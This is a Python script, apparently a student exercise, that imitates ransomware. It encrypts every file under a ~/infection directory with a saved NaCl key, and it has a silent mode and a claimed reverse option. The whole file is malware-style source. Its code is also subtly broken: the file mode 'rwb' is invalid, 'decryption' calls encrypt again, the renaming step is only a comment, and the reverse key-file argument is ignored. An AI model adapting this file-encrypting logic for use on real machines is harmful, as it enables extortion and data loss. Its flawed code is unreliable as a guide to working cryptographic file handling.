#!/usr/bin/env python3

import argparse
import os
import sys
from nacl import utils, secret

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"

PROGRAM_VERSION = "1.0.0"
SECRET_KEY_FILE = "key.stockholm"
DIRECTORY = os.path.expanduser("~/infection")

def encrypt_files(secret_key):
    box = secret.SecretBox(secret_key)

    if not os.path.exists(DIRECTORY):
        print(f"{RED}Directory not found: {DIRECTORY}{RESET}")
        return

    for root, _, files in os.walk(DIRECTORY):
        for file_name in files:
            file_path = os.path.join(root, file_name)

            if file_name.endswith(".ft"):
                print(f"{YELLOW}Skipping already encrypted file: {file_path}{RESET}")
                continue

            try:
                with open(file_path, 'rwb') as file:
                    file_data = file.read()

                    encrypted_data = box.encrypt(file_data)

                    file.write(encrypted_data)
                    # rename the file by adding .ft extension

                    print(f"{GREEN}Encrypted: {file_path} -> {file_path}{RESET}")

            except Exception as e:
                print(f"{RED}Failed to encrypt {file_path}: {e}{RESET}")

def decrypt_files(secret_key):
    box = secret.SecretBox(secret_key)

    if not os.path.exists(DIRECTORY):
        print(f"{RED}Directory not found: {DIRECTORY}{RESET}")
        return

    for root, _, files in os.walk(DIRECTORY):
        for file_name in files:
            file_path = os.path.join(root, file_name)

            if not file_name.endswith(".ft"):
                print(f"{YELLOW}Skipping uncrypted file: {file_path}{RESET}")
                continue

            try:
                with open(file_path, 'rwb') as file:
                    file_data = file.read()

                    decrypted_data = box.encrypt(file_data)

                    file.write(decrypted_data)

                    print(f"{GREEN}Encrypted: {file_path} -> {file_path}{RESET}")

            except Exception as e:
                print(f"{RED}Failed to decrypt {file_path}: {e}{RESET}")

def get_secret_key():

    # if exists -> open -> return key
    # elif not reverse -> create
    # else (reverse) -> error

    if os.path.exists(SECRET_KEY_FILE):
        try:
            with open(SECRET_KEY_FILE, 'rb') as file:
                secret_key = file.read()

            if len(secret_key) != secret.SecretBox.KEY_SIZE:
                print(f"{RED}Invalid key size. Ensure the key is 32 bytes long.{RESET}")
                exit(1)

        except Exception as e:
            print(f"{RED}An error occurred: {e}{RESET}")

        print(f"{YELLOW}Secret key already exists at {SECRET_KEY_FILE}. No new key generated.{RESET}")
    else:
        secret_key = utils.random(secret.SecretBox.KEY_SIZE)

        with open(SECRET_KEY_FILE, 'wb') as file:
            file.write(secret_key)

        print(f"{GREEN}Secret key saved successfully to {SECRET_KEY_FILE}.{RESET}")

    return secret_key

def parse_arguments():
    parser = argparse.ArgumentParser(description="harmless malware")

    parser.add_argument("-v", "--version", action="version", version=f"{YELLOW}%(prog)s {PROGRAM_VERSION}{RESET}", help="Show the program version.")
    parser.add_argument("-r", "--reverse", metavar="KEY_FILE", type=str, help="Path to the file containing the key to reverse the infection.")
    parser.add_argument("-s", "--silent", action="store_true", help="Run the program without producing any output.")

    return parser.parse_args()

def main():
    args = parse_arguments()

    if args.silent:
        devnull = os.open(os.devnull, os.O_WRONLY)
        os.dup2(devnull, sys.stdout.fileno())

    secret_key = get_secret_key()

    if args.reverse:
        decrypt_files(secret_key)
    else:
        encrypt_files(secret_key)

if __name__ == "__main__":
    main()
